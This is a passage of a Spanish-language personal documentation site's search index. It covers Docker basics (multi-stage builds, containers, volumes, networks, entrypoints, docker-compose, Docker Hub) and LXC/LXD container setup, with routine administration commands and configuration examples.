RUN cd /app && mvn package FROM openjdk:8-alpine COPY --from = builder /app/target/my-app-1.0-SNAPSHOT.jar /opt/app.jar CMD java -jar /opt/app.jar debian \u279c docker build -t multi-stage . REPOSITORY TAG IMAGE ID CREATED SIZE multi-stage latest 3051e85589f3 21 seconds ago 105MB <none> <none> 6b149ba281fe 37 seconds ago 131MB openjdk 8 -alpine e9ea51023687 2 days ago 105MB maven 3 .5-alpine fb4bb0d89941 4 months ago 119MB Explicaci\u00f3n de todo esto. Obviamente tenemos las im\u00e1genes oficiales de maven, y openjdk que hemos utilizado de base. Despu\u00e9s tenemos la 2\u00aa l\u00ednea una imagen hu\u00e9rfana, que es la utilizada para compilar la app, podemos ver que se a inflado 11MB en dependencias de su base maven. Por ultimo tenemos la imagen multi-stage donde hemos copiado la app compilada, por lo tanto podr\u00edamos borrar todas las dem\u00e1s im\u00e1genes y ahorrar ese espacio de mas que no necesitamos de nada.","title":"Multi Stage Build"},{"location":"virtualizacion/Docker-basico/#contenedores","text":"Los contenedores se crean a partir de una imagen y son los encargados de mantener activos los servicios. --name nombre-contenedor -p 8000 :80 # exponer puerto 8000 puerto local 80 puerto contenedor -v ./path/local:/path/to/image # punto de montage comun --volume=host-dir:container-dir:options -it centos /bin/bash # tty interactive -e \"prueba1=1234\" # a\u00f1adir variable de entorno -cp archivo contenedor:ruta # copiar archivo dentro de un contenedor --rm -it # genera contenedores temporales, una vez sales de la onsola se elimina # limitar recursos -m \"500mb\" # limitar MiB de memoria ue puede usar --cpuset-cpus 0 -1 # numeros de cpu permito usar Sintaxis: # nombre contenedor puertos nombre de imagen docker run --name docker-nginx -p 8000 :80 nginx Ejemplos crear contenedores # contendor interactivo, puedes acceder a el docker run -dti --name centos1 centos # Crear contenedor con directorio local montado en contenedor docker run --name docker-nginx -p 8000 :80 -v ~/docker-nginx/html:/usr/share/nginx/html nginx # contenedor con red especifica docker run -dti --name centos3 --network test1 centos # contenedor con red e ip concreta, solo podras asignar ip si es una subred docker run -dti --name centos3 --network test1 --ip 172 .30.0.10 centos Acceder a un contenedor docker exec -ti docker-nginx /bin/bash # acceder a un contenedor docker exec -u root -ti docker-nginx /bin/bash # acceder a un contenedor con user esec\u00edfico Generar imagen desde un contenedor docker commit --change = 'CMD [\"apache2ctl\", \" -D FOREGROUND\"]' -c \"EXPOSE 80\" nueva-imagen-apache no es necesario sobreescribir el CMD aun que es recomendable.","title":"Contenedores"},{"location":"virtualizacion/Docker-basico/#volumenes","text":"Un volumen es un punto de montage desde un contenedor a nuestro host. xisten diferentes tipo de volumenes. Host: Volumen host es el mas \u00fatil y facil de utilizar -v /path/host:path/container de esta manera todo lo que se crea en el directorio del contenedor montado, se respalda en el host. Anonimo: volumnen anonimo es lo mismo pero crea ese punto de montage en el directorio volmes de docker, por defecto /var/lib/docker/volumes , el problema de este es que crea un directorio con un nombre de x digitos y es poco amigable de trabajar con el e identificarlo. utilizaci\u00f3n -v /path/container Al crear un volumen en Dockerfile se crea como anonimo. Nombrado: volumen nombrado es un punto de montage con un volumen creado con anterioridad. Estos volumenes se crean en /var/lib/docker/volumes , a diferencia de los anonimos estos se crean con un nombre especifico. ```bash docker volume create my-volumen ls /var/lib/docker/volumes my-volumen docker run -d --name nginx-web -p 80:80 -v my-volumen:/var/www/html nginx ```","title":"Volumenes"},{"location":"virtualizacion/Docker-basico/#redes","text":"La red por defecto al instalar docker es docker0 , crea una red virtual en modo bridge donde todos los contenedores por defecto se conectaran a ella. En ocasiones quremos que diversos servicios no esten en la misma red, para ello podemos crear diferentes redes o subredes para aislarlos. Tios de red: Bridge: Es una red virtual dentro de nuestra red de host, donde crea un puente para salir al exterior mediante la ip de host local. ( red default de los contenedores ) Host: El contenedor utilizara la misma ip que el servidor real, red eth0 o la que tenga el dispositivo, incluso hostname. None: Se utiliza para indicar que el contenedor no tiene red asignada. Overlay: docker network ls # listar redes docker network inspect nombre-red # iformaci\u00f3n de la red docker network create test-network # crear nueva red por defecto bridge docker run -dti --network test-network --name test1 centos # crear contenedor con una red concreta docker run -dti --network host --name test2 centos # crear contenedor con red local: ip, hostname, interfaces. docker run -dti --network none --name test3 centos # contenedor sin red # para crear un contenedor con una ip concreta, primero a de crearse una subred docker network create -d bridge --subnet 172 .124.10.0./24 --gateway 172 .124.10.1 nueva-subred # crear subred docker run -dti --name centos3 --network test1 --ip 172 .30.0.10 centos # crear contenedo con ip especifica docker network connect red-a-conectar contenedor # a\u00f1adir red a contenedor docker network disconnect red-a-conectar contenedor # eliminar red de contenedor docker network rm red # eliminar red creada, no tiene que estar utilizada por ningun contenedor docker network prune # eliminasr redes en desuso docker run -d -p 127 .0.0.1:8081:80 nginx \u200b","title":"Redes"},{"location":"virtualizacion/Docker-basico/#subir-imagen-a-dockerhub","text":"docker login docker commit nombre-container nombre-nueva-imagen docker commit lunch_mirie mychispas docker tag mychispas:latest jorgepastorr/mychispas:latest docker push jorgepastorr/mychispas:latest ver imagenes en el repositorio remoto docker search jorgepastorr","title":"Subir imagen a dockerhub"},{"location":"virtualizacion/Docker-basico/#entrypoints","text":"entripoint permite tratar un contenedor como un script, de esta manera se puede asignar argumentos a el arranque de un contenedor. si un Dockerfile comparte entrypoint con cmd el cmp se sumara como argumento al entripoint FROM ubuntu ENTRYPOINT [ \"top\" , \"-b\" ] CMD [ \"-c\" ] $ docker exec -it test ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 2 .6 0 .1 19752 2352 ? Ss+ 08 :24 0 :00 top -b -c En cambio si desde la linea de comandos al arrncar el docker especifico un argumento el cmd se anula docker run -it --rm --name test top -H $ docker exec -it test ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 2 .6 0 .1 19752 2352 ? Ss+ 08 :24 0 :00 top -b -H Se puede sobreescrivir el entripoint manualmente desde linea de comandos docker run --rm --entrypoint /usr/bin/cal -it test el 0.0.0.0 significa que en todas las interficies de red del host esta escuchando por el puerto 389 ldap.edt.org /bin/sh -c /opt/docker/sta ... Up 0 .0.0.0:389->389/tcp","title":"Entrypoints"},{"location":"virtualizacion/Docker-basico/#docker-compose","text":"","title":"docker-compose"},{"location":"virtualizacion/Docker-basico/#instalar_1","text":"web oficial docker compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.23.2/docker-compose- $( uname -s ) - $( uname -m ) \" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose documentacion oficial compose","title":"Instalar"},{"location":"virtualizacion/Docker-basico/#desplegar-docker-compose","text":"docker-compose up -d # crear, actualizar contenedor docker-compose -p webtest up -d # ombrar proyecto, red sera webtest-default docker-compose -f docker-compose-nginx.yml up -d # desplegar en nombre archivo distinto docker-compose build # crear imagen docker-compose logs -f # ver logs de los contenedores corriendo docker compose <Enter> # todas las opciones docker-compose down # eliminar contenedor docker-compose pause ldap # parar container docker-compose unpause ldap # pausar container docker-compose stop ldap docker-compose start ldap docker-compose ps docker-compose top ldap docker-compose images","title":"Desplegar docker compose"},{"location":"virtualizacion/Docker-basico/#estructura","text":"","title":"Estructura"},{"location":"virtualizacion/Docker-basico/#estructura-basica","text":"version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\"","title":"Estructura b\u00e1sica"},{"location":"virtualizacion/Docker-basico/#variables-de-entorno","text":"Se pueden definir en el mismo yaml o en un archivo externo que recogemos. environment : - RACK_ENV=development - SHOW=true - SESSION_SECRET env_file : .env env_file : - ./common.env - ./apps/web.env - /opt/secrets.env","title":"Variables de entorno"},{"location":"virtualizacion/Docker-basico/#volumenes_1","text":"Nombrados Estos volumenes por defecto se crean nen /var/lib/docker/volumes version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" volumes : - \"vol2:/usr/share/nginx/html\" volumes : vol2 : Host Se a\u00f1ade ruta relativa o absoluta donde se quiere que se cree el volumen version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" volumes : - \"./html:/usr/share/nginx/html\"","title":"Volumenes"},{"location":"virtualizacion/Docker-basico/#redes-compose","text":"Las redes dentro de compose sirve para crear uno o varios contenedores dentro de una red especifica. version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" networks : - net-test networks : net-test :","title":"Redes-Compose"},{"location":"virtualizacion/Docker-basico/#crear-imagen","text":"build indica donde se encuentra el Dockerfile que tiene que fabricar. En este ejemplo, primero fabricara una imagen nombrada web-centos y luego creara un contenedor web-centos version : '3' services : web : image : web-centos build : . command : python -m SimpleHTTPServer 8080 container_name : web-centos ports : - \"8080:8080\" docker-compose up --build -d","title":"Crear imagen"},{"location":"virtualizacion/Docker-basico/#sobreescribir-cmd","text":"En ocasiones queremos sobreescribir el cmd de una imagen, en el siguiente ejemplo vemos como una imagen centos que su cmd por defecto es /bin/bash , ahora es una instrucci\u00f3n de python. version : '3' services : web : image : centos command : python -m SimpleHTTPServer 8080 ports : - \"8080:8080\" CONTAINER ID IMAGE COMMAND f4e99be647702b web-centos \"python -m SimpleHTTPServer 8080\"","title":"Sobreescribir CMD"},{"location":"virtualizacion/Docker-basico/#politica-reinincio","text":"no : si el contenedor se apaga por alguna razon, no se reiniciara. ( por defecto ) on-failure : si el contenedor se a caido por alg\u00fan error se reiniciara. unless-stopped : cada vez que el contenedor se apage o caiga se reiniciara, a no ser que lo apages manualmente. always : cada vez que el contenedor se apage o caiga se reiniciara version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" restart : always","title":"Politica reinincio"},{"location":"virtualizacion/Docker-basico/#multiples-servicios","text":"la gracia de compose es desplegar multiples servicios de golpe, en el siguiente ejemplo se ve como e ejecuta joomla junto con mysql en una red conjunta. version : '3' services : db : container_name : joomla-db image : mysql:5.7 volumes : - $PWD/data:/var/lib/mysql environment : MYSQL_ROOT_PASSWORD : example MYSQL_USER : joomla MYSQL_DATABASE : joomla MYSQL_PASSWORD : joomla networks : - my_net web : container_name : joomla-web image : joomla depends_on : - db volumes : - $PWD/html:/var/www/html ports : - 80:80 environment : JOOMLA_DB_HOST : db JOOMLA_DB_PASSWORD : joomla JOOMLA_DB_USER : joomla JOOMLA_DB_NAME : joomla networks : - my_net networks : my_net :","title":"M\u00faltiples servicios"},{"location":"virtualizacion/Docker-basico/#dockerhub","text":"docker login # logearse Obviamente hay que tener una cuenta. Cambiar de nombre a una imagen y subir docker tag mi-debian-imagen jorgepastorr/debian-update # por ejemplo docker push jorgepastorr/debian-update # subir la imagen","title":"DockerHub"},{"location":"virtualizacion/Lxc/","text":"LXC y LXD LXC es una interfaz de espacio de usuario para las funciones de contenci\u00f3n del kernel de Linux. A trav\u00e9s de una poderosa API y herramientas simples, permite a los usuarios de Linux crear y administrar f\u00e1cilmente contenedores de aplicaciones o sistemas. La virtualizaci\u00f3n de LXC es un intermedio de una m\u00e1quina virtual de virtualbox, virtmanger.. y docker. Se basa creando contenedores directamente desde el kernel del host haciendo una paravirtualizaci\u00f3n muy eficaz y baja en recursos. LXD es la siguiente generaci\u00f3n de systemas de contenedores ofrece algunas mejoras a LXC, al ser creado por Canonical en distribuciones como debian no se encuentra en los repositorios a dia de hoy. Documentaci\u00f3n linuxcontainers debian wiki github Instalaci\u00f3n Por defecto en debian y ubuntu biene instalado, en caso contrario. sudo apt install lxc o sudo snap install lxd Intefazes de red Con LXD tiene un configurador con lxd init que configuras la red entre otros, con LXC se tiene que hacer manualmente. Independent bridge Esta configuraci\u00f3n crea una nueva interfaz de red donde se alojaran los contenedores \u279c ~ cat /etc/default/lxc-net USE_LXC_BRIDGE=\"true\" LXC_BRIDGE=\"lxcbr0\" LXC_ADDR=\"10.0.3.1\" LXC_NETMASK=\"255.255.255.0\" LXC_NETWORK=\"10.0.3.0/24\" LXC_DHCP_RANGE=\"10.0.3.2,10.0.3.254\" LXC_DHCP_MAX=\"253\" \u279c ~ cat /etc/lxc/default.conf lxc.net.0.type = veth lxc.net.0.link = lxcbr0 lxc.net.0.flags = up lxc.net.0.hwaddr = 00:16:3e:xx:xx:xx Crear interfaz. sudo systemctl start lxc-net.service Host-shared bridge Esta configuraci\u00f3n de red es un NAT, igual que hacen las m\u00e1quinas virtuales por defecto. \u279c ~ cat /etc/lxc/default.conf lxc.net.0.type = veth lxc.net.0.link = virbr0 lxc.net.0.flags = up # you can leave these lines as they were: lxc.apparmor.profile = generated lxc.apparmor.allow_nesting = 1 Host device as bridge Con esta configuraci\u00f3n creamos un bridge a la targeta de red f\u00edsica, por lo tanto los host de la LAN se podr\u00e1n comunicar con el container. \u279c cat /etc/lxc/default.conf #lxc.net.0.type = empty #lxc.apparmor.profile = generated #lxc.apparmor.allow_nesting = 1 lxc.net.0.type = veth lxc.net.0.link = lxcbr0 lxc.net.0.flags = up lxc.net.0.hwaddr = 00:16:3e:xx:xx:xx \u279c cat /etc/network/interfaces auto lxcbr0 iface lxcbr0 inet dhcp bridge_ports enp3s0 bridge_fd 0 bridge_maxwait 0 \u279c ~ cat /etc/default/lxc-net USE_LXC_BRIDGE=\"true\" LXC_BRIDGE=\"lxcbr0\" LXC_ADDR=\"10.0.3.1\" LXC_NETMASK=\"255.255.255.0\" LXC_NETWORK=\"10.0.3.0/24\" LXC_DHCP_RANGE=\"10.0.3.2,10.0.3.254\" LXC_DHCP_MAX=\"253\" LXC Configuraci\u00f3n La configuraci\u00f3n por defecto se encuentra en /etc/lxc/default.con Al crear contenedores estos se crean en /var/lib/lxc/ y la configuraci\u00f3n del contenedor se encuentra en /var/lib/lxc/<nombre contenedor>/config La informaci\u00f3n de la vconfiguraci\u00f3n de contenedores se encuentra en man lxc.container.conf Listar imagenes base Las plantillas de imagenes se almacenan en /usr/share/lxc/templates listado de imagenes Comandos b\u00e1sicos # crear un contenedor debian # las diferentes opciones son para escoger release, architectiura o configuracion diferente lxc-create --name deb --template debian lxc-create --name deb --template debian -- -r stretch lxc-create -n c1 -t download -- -d debian -r buster -a amd64 lxc-create -n deb -t debian -- -r stretch -a i386 lxc-create -n deb -f config-file.conf -t debian -- -r stretch # listar contenedores lxc-ls --fancy lxc-info -n deb # arrancar, apagar, eliminar lxc-start -n deb lxc-stop -n deb lxc-destroy -n deb lxc-destroy -n deb --snapshots # eliminar contenedor con snaps # entrar al contenedor lxc-attach -n deb bash Copiar/Renombrar contenedor Para copiar o renombrar un contenedor debe estar parado lxc-copy --name deb --newname debi lxc-copy --rename debi --newname dex Snapshot Para crear snapshots y restaurarlos los contenedores afectados tienen que estar apagados, al restaurar un snapshot si se le indica creara un contenedor nuevo. # crear snapshot del contenedor deb con un comentario lxc-snapshot -n deb # sin comentario lxc-snapshot -n deb --comment file-comment-snap # listar snaps del contenedor lxc-snapshot -n deb -L snap0 ( /var/lib/lxc/deb/snaps ) 2020 :12:23 08 :49:15 # listar snaps del contenedor y sus comentarios lxc-snapshot -n deb -L --showcomments snap0 ( /var/lib/lxc/deb/snaps ) 2020 :12:23 08 :49:15 Primer snap del container deb # restaurar snapshot lxc-snapshot -n deb --restore snap0 # restaurar snapshot snap0 de vm1 creando un contenedor nuevo vm2 lxc-snapshot -n vm1 --restore snap0 --newname vm2 lxc-snapshot -n vm1 -r snap0 -N vm2 # eliminar snapshot lxc-snapshot -n vm1 --destroy snap2 lxc-snapshot -n vm1 -d snap2 Al restaurar un snapshot en un conenedor nuevo por defecto se crea en /var/lib/lxc esto se puede canviar especificando una ruta diferente lxc-snapshot -n vm1 --restore snap0 --newname vm2 --lxcpath /link/lxc lxc-snapshot -n vm1 -r snap0 -N vm2 -P /link/lxc Autostart Loos contenedores tienen la opci\u00f3n de arrancar con el sistema si se asigna la opci\u00f3n lxc.start.auto=1 \u279c ~ sudo cat /var/lib/lxc/p1/config ... lxc.start.auto = 1 lxc.start.delay = 10 lxc.start.order = 100 lxc.group = debian lxc.start.order es la prioridad de arrancar entre contenedores, el numero mas alto tiene prioridad, es decir arranca primero lxc.start.delay es un timeout de espera para arrncar el siguiente contenedor. Limitar recursos limita la ram y la cpu de un contenedor, en el siguiente ejemplo, 128MB ram \u279c ~ sudo cat /var/lib/lxc/p1/config ... lxc.cgroup.memory.limit_in_bytes = 134217728 lxc.cgroup.cpuset.cpus = 0 ,3 Unprivileged Correr containers sin privilegios de administrador (como usuario) La principal diferencia ser\u00e1 que los contenedores se van a crear en el home del usuario y la configuraci\u00f3n de directorios quedaria as\u00ed: /etc/lxc/lxc.conf = > ~/.config/lxc/lxc.conf /etc/lxc/default.conf = > ~/.config/lxc/default.conf /var/lib/lxc = > ~/.local/share/lxc /var/lib/lxcsnaps = > ~/.local/share/lxcsnaps /var/cache/lxc = > ~/.cache/lxc Es necesario tener un mapa de gid como de uid, esto normalmente se tiene por defecto. \u279c grep $USER /etc/sub?id /etc/subgid:debian:100000:65536 /etc/subuid:debian:100000:65536 En caso de no tener un mpa asignado, se puede crear uno. sudo usermod --add-subuids 100000 -165536 $USER sudo usermod --add-subgids 100000 -165536 $USER Tener habilitado los privilegios en el kerner. # mirar como esta definido sudo sysctl kernel.unprivileged_userns_clone # habilitar temporalmente sudo sysctl -w kernel.unprivileged_userns_clone = 1 # habilitarlo echo \"kernel.unprivileged_userns_clone=1\" | sudo tee /etc/sysctl.d/80-lxc-userns.conf Copiar el archivo de configuraci\u00f3n a la ruta del usuario y a\u00f1adirle los permisos de los mapas mkdir ~/.config/lxc cp /etc/lxc/default.conf ~/.config/lxc/default.conf \u279c cat /etc/lxc/default.conf ... lxc.idmap = u 0 100000 65536 lxc.idmap = g 0 100000 65536 Para finalizar dar permiso al usuario que use el bridge, la interfaz lxcbr0 puede cambiar si has definido con nombre diferente en la configurac\u00f3n. cat /etc/lxc/lxc-usernet <your username> veth lxcbr0 10 Lanzar contenedor \u279c lxc-create -n p1 -t download -- -d debian -r buster -a amd64 Volumenes Para montar otro sistema de archivos en el contenedor, agregue a /var/lib/lxc/mycontainer/config y despues reinicie el contenedor: lxc.mount.entry = /path/in/host/mount_point mount_point_in_container none bind 0 0 # lo mismo lxc.mount.entry = /var/www/html mnt/data none bind 0 0 Otro ejemplo de montaje de enlace: # Exposes /dev/sde in the container lxc.mount.entry = /dev/sde dev/sde none bind,optional,create = file Para montar en otro sistema de archivos, por ejemplo, LVM en un punto de montaje de contenedor lxc.mount.entry = /dev/mapper/lvmfs-home-partition home ext4 defaults 0 2 LXD En caso de debian para las instalaci\u00f3n de LXD hay que utilizar snap o descargar el .deb , desde ubunto ya lo enemos en los repositorios oficiales. documentaci\u00f3n LXD snap install lxd # asigno el usuario al grupo lxd para no utilizar sudo sudo usermod -aG lxd <usuario> getent group lxd Configuraci\u00f3n iniciar configuraci\u00f3n b\u00e1sica de LXD, como interfaz de red, storage predeterminado, etc... lxd init Listar imagenes base # listar imagenes del repositorio lxc image list images: # listar imagenes locales lxc list Comandos b\u00e1sicos # crear un contnedor ubuntu llamado myvm lxc lunch ubuntu/20.10 myvm # arrancar, parar, eliminar lxc start myvm lxc stop myvm lxc delete myvm # ejcutar commando dentro del shell lxc exec myvm bash # copiar contenedor lxc copy myvm newvm # renombrar contenedor lxc move myvm groovy # ver informacion del contenedor y su configuraci\u00f3n lxc info groovy lxc config show groovy Config contenedores Los contenedores e pueden na\u00f1adir configraciones extra o limitaciones como por ejemplo ram o cpu, existen muchas opciones a configurar # limitar memoria y cpu lxc config set groovy limits.memory 512MB lxc config set groovy limits.cpu 1 lxc config show groovy # dar permisos extra para poder crear contenedores recursivos lxc config set groovy security.privileged true lxc config set groovy security.nesting true Profile por defecto existe la configuraci\u00f3n default para contenedore que se asigna automaticamente, si creamos nuestra propia configuraci\u00f3n la podemos asignar a nuevos contenedores. # listar y ver profile lxc profile list lxc profile show default # crear un profil nuevo y editarlo al gusto lxc profile copy default custom lxc profile edit custom # asignar profile a un nuevo contenedor lxc lunch ubuntu/20.10 groovy --profile custom File file permite a\u00f1adir o exttraer archivos a un contenedor lxc file push myfile groovy/root lxc file pull groovy/root/myfile . Snapshot Se pueden hacer copias de seguridad r\u00e1pidamente creando un snapshot del contenedor y en cualquier momento restaurarlo # crear snashot snap1 de contenedor groovy lxc snapshot groovy snap1 # ver snap creado lxc info groovy # restaurar snapshot lxc restore groovy snap1","title":"LXC y LXD"},{"location":"virtualizacion/Lxc/#lxc-y-lxd","text":"LXC es una interfaz de espacio de usuario para las funciones de contenci\u00f3n del kernel de Linux. A trav\u00e9s de una poderosa API y herramientas simples, permite a los usuarios de Linux crear y administrar f\u00e1cilmente contenedores de aplicaciones o sistemas. La virtualizaci\u00f3n de LXC es un intermedio de una m\u00e1quina virtual de virtualbox, virtmanger.. y docker. Se basa creando contenedores directamente desde el kernel del host haciendo una paravirtualizaci\u00f3n muy eficaz y baja en recursos. LXD es la siguiente generaci\u00f3n de systemas de contenedores ofrece algunas mejoras a LXC, al ser creado por Canonical en distribuciones como debian no se encuentra en los repositorios a dia de hoy.","title":"LXC y LXD"},{"location":"virtualizacion/Lxc/#documentacion","text":"linuxcontainers debian wiki github","title":"Documentaci\u00f3n"},{"location":"virtualizacion/Lxc/#instalacion","text":"Por defecto en debian y ubuntu biene instalado, en caso contrario. sudo apt install lxc o sudo snap install lxd","title":"Instalaci\u00f3n"},{"location":"virtualizacion/Lxc/#intefazes-de-red","text":"Con LXD tiene un configurador con lxd init que configuras la red entre otros, con LXC se tiene que hacer manualmente.","title":"Intefazes de red"},{"location":"virtualizacion/Lxc/#independent-bridge","text":"Esta configuraci\u00f3n crea una nueva interfaz de red donde se alojaran los contenedores \u279c ~ cat /etc/default/lxc-net USE_LXC_BRIDGE=\"true\" LXC_BRIDGE=\"lxcbr0\" LXC_ADDR=\"10.0.3.1\" LXC_NETMASK=\"255.255.255.0\" LXC_NETWORK=\"10.0.3.0/24\" LXC_DHCP_RANGE=\"10.0.3.2,10.0.3.254\" LXC_DHCP_MAX=\"253\" \u279c ~ cat /etc/lxc/default.conf lxc.net.0.type = veth lxc.net.0.link = lxcbr0 lxc.net.0.flags = up lxc.net.0.hwaddr = 00:16:3e:xx:xx:xx Crear interfaz. sudo systemctl start lxc-net.service","title":"Independent bridge"},{"location":"virtualizacion/Lxc/#host-shared-bridge","text":"Esta configuraci\u00f3n de red es un NAT, igual que hacen las m\u00e1quinas virtuales por defecto. \u279c ~ cat /etc/lxc/default.conf lxc.net.0.type = veth lxc.net.0.link = virbr0 lxc.net.0.flags = up # you can leave these lines as they were: lxc.apparmor.profile = generated lxc.apparmor.allow_nesting = 1","title":"Host-shared bridge"},{"location":"virtualizacion/Lxc/#host-device-as-bridge","text":"Con esta configuraci\u00f3n creamos un bridge a la targeta de red f\u00edsica, por lo tanto los host de la LAN se podr\u00e1n comunicar con el container. \u279c cat /etc/lxc/default.conf #lxc.net.0.type = empty #lxc.apparmor.profile = generated #lxc.apparmor.allow_nesting = 1 lxc.net.0.type = veth lxc.net.0.link = lxcbr0 lxc.net.0.flags = up lxc.net.0.hwaddr = 00:16:3e:xx:xx:xx \u279c cat /etc/network/interfaces auto lxcbr0 iface lxcbr0 inet dhcp bridge_ports enp3s0 bridge_fd 0 bridge_maxwait 0 \u279c ~ cat /etc/default/lxc-net USE_LXC_BRIDGE=\"true\" LXC_BRIDGE=\"lxcbr0\" LXC_ADDR=\"10.0.3.1\" LXC_NETMASK=\"255.255.255.0\" LXC_NETWORK=\"10.0.3.0/24\" LXC_DHCP_RANGE=\"10.0.3.2,10.0.3.254\" LXC_DHCP_MAX=\"253\"","title":"Host device as bridge"},{"location":"virtualizacion/Lxc/#lxc","text":"","title":"LXC"},{"location":"virtualizacion/Lxc/#configuracion","text":"La configuraci\u00f3n por defecto se encuentra en /etc/lxc/default.con Al crear contenedores estos se crean en /var/lib/lxc/ y la configuraci\u00f3n del contenedor se encuentra en /var/lib/lxc/<nombre contenedor>/config La informaci\u00f3n de la vconfiguraci\u00f3n de contenedores se encuentra en man lxc.container.conf","title":"Configuraci\u00f3n"},{"location":"virtualizacion/Lxc/#listar-imagenes-base","text":"Las plantillas de imagenes se almacenan en /usr/share/lxc/templates listado de imagenes","title":"Listar imagenes base"},{"location":"virtualizacion/Lxc/#comandos-basicos","text":"# crear un contenedor debian # las diferentes opciones son para escoger release, architectiura o configuracion diferente lxc-create --name deb --template debian lxc-create --name deb --template debian -- -r stretch lxc-create -n c1 -t download -- -d debian -r buster -a amd64 lxc-create -n deb -t debian -- -r stretch -a i386 lxc-create -n deb -f config-file.conf -t debian -- -r stretch # listar contenedores lxc-ls --fancy lxc-info -n deb # arrancar, apagar, eliminar lxc-start -n deb lxc-stop -n deb lxc-destroy -n deb lxc-destroy -n deb --snapshots # eliminar contenedor con snaps # entrar al contenedor lxc-attach -n deb bash","title":"Comandos b\u00e1sicos"},{"location":"virtualizacion/Lxc/#copiarrenombrar-contenedor","text":"Para copiar o renombrar un contenedor debe estar parado lxc-copy --name deb --newname debi lxc-copy --rename debi --newname dex","title":"Copiar/Renombrar contenedor"},{"location":"virtualizacion/Lxc/#snapshot","text":"Para crear snapshots y restaurarlos los contenedores afectados tienen que estar apagados, al restaurar un snapshot si se le indica creara un contenedor nuevo. # crear snapshot del contenedor deb con un comentario lxc-snapshot -n deb # sin comentario lxc-snapshot -n deb --comment file-comment-snap # listar snaps del contenedor lxc-snapshot -n deb -L snap0 ( /var/lib/lxc/deb/snaps ) 2020 :12:23 08 :49:15 # listar snaps del contenedor y sus comentarios lxc-snapshot -n deb -L --showcomments snap0 ( /var/lib/lxc/deb/snaps ) 2020 :12:23 08 :49:15 Primer snap del container deb # restaurar snapshot lxc-snapshot -n deb --restore snap0 # restaurar snapshot snap0 de vm1 creando un contenedor nuevo vm2 lxc-snapshot -n vm1 --restore snap0 --newname vm2 lxc-snapshot -n vm1 -r snap0 -N vm2 # eliminar snapshot lxc-snapshot -n vm1 --destroy snap2 lxc-snapshot -n vm1 -d snap2 Al restaurar un snapshot en un conenedor nuevo por defecto se crea en /var/lib/lxc esto se puede canviar especificando una ruta diferente lxc-snapshot -n vm1 --restore snap0 --newname vm2 --lxcpath /link/lxc lxc-snapshot -n vm1 -r snap0 -N vm2 -P /link/lxc","title":"Snapshot"},{"location":"virtualizacion/Lxc/#autostart","text":"Loos contenedores tienen la opci\u00f3n de arrancar con el sistema si se asigna la opci\u00f3n lxc.start.auto=1 \u279c ~ sudo cat /var/lib/lxc/p1/config ... lxc.start.auto = 1 lxc.start.delay = 10 lxc.start.order = 100 lxc.group = debian lxc.start.order es la prioridad de arrancar entre contenedores, el numero mas alto tiene prioridad, es decir arranca primero lxc.start.delay es un timeout de espera para arrncar el siguiente contenedor.","title":"Autostart"},{"location":"virtualizacion/Lxc/#limitar-recursos","text":"limita la ram y la cpu de un contenedor, en el siguiente ejemplo, 128MB ram \u279c ~ sudo cat /var/lib/lxc/p1/config ... lxc.cgroup.memory.limit_in_bytes = 134217728 lxc.cgroup.cpuset.cpus = 0 ,3","title":"Limitar recursos"},{"location":"virtualizacion/Lxc/#unprivileged","text":"Correr containers sin privilegios de administrador (como usuario) La principal diferencia ser\u00e1 que los contenedores se van a crear en el home del usuario y la configuraci\u00f3n de directorios quedaria as\u00ed: /etc/lxc/lxc.conf = > ~/.config/lxc/lxc.conf /etc/lxc/default.conf = > ~/.config/lxc/default.conf /var/lib/lxc = > ~/.local/share/lxc /var/lib/lxcsnaps = > ~/.local/share/lxcsnaps /var/cache/lxc = > ~/.cache/lxc Es necesario tener un mapa de gid como de uid, esto normalmente se tiene por defecto. \u279c grep $USER /etc/sub?id /etc/subgid:debian:100000:65536 /etc/subuid:debian:100000:65536 En caso de no tener un mpa asignado, se puede crear uno. sudo usermod --add-subuids 100000 -165536 $USER sudo usermod --add-subgids 100000 -165536 $USER Tener habilitado los privilegios en el kerner. # mirar como esta definido sudo sysctl kernel.unprivileged_userns_clone # habilitar temporalmente sudo sysctl -w kernel.unprivileged_userns_clone = 1 # habilitarlo echo \"kernel.unprivileged_userns_clone=1\" | sudo tee /etc/sysctl.d/80-lxc-userns.conf Copiar el archivo de configuraci\u00f3n a la ruta del usuario y a\u00f1adirle los permisos de los mapas mkdir ~/.config/lxc cp /etc/lxc/default.conf ~/.config/lxc/default.conf \u279c cat /etc/lxc/default.conf ... lxc.idmap = u 0 100000 65536 lxc.idmap = g 0 100000 65536 Para finalizar dar permiso al usuario que use el bridge, la interfaz lxcbr0 puede cambiar si has definido con nombre diferente en la configurac\u00f3n. cat /etc/lxc/lxc-usernet <your username> veth lxcbr0 10 Lanzar contenedor \u279c lxc-create -n p1 -t download -- -d debian -r buster -a amd64","title":"Unprivileged"},{"location":"virtualizacion/Lxc/#volumenes","text":"Para montar otro sistema de archivos en el contenedor, agregue a /var/lib/lxc/mycontainer/config y despues reinicie el contenedor: lxc.mount.entry = /path/in/host/mount_point mount_point_in_container none bind 0 0 # lo mismo lxc.mount.entry = /var/www/html mnt/data none bind 0 0 Otro ejemplo de montaje de enlace: # Exposes /dev/sde in the container lxc.mount.entry = /dev/sde dev/sde none bind,optional,create = file Para montar en otro sistema de archivos, por ejemplo, LVM en un punto de montaje de contenedor lxc.mount.entry = /dev/mapper/lvmfs-home-partition home ext4 defaults 0 2","title":"Volumenes"},{"location":"virtualizacion/Lxc/#lxd","text":"En caso de debian para las instalaci\u00f3n de LXD hay que utilizar snap o descargar el .deb , desde ubunto ya lo enemos en los repositorios oficiales. documentaci\u00f3n LXD snap install lxd # asigno el usuario al grupo lxd para no utilizar sudo sudo usermod -aG lxd <usuario> getent group lxd","title":"LXD"},{"location":"virtualizacion/Lxc/#configuracion_1","text":"iniciar configuraci\u00f3n b\u00e1sica de LXD, como interfaz de red, storage predeterminado, etc... lxd init","title":"Configuraci\u00f3n"},{"location":"virtualizacion/Lxc/#listar-imagenes-base_1","text":"# listar imagenes del repositorio lxc image list images: # listar imagenes locales lxc list","title":"Listar imagenes 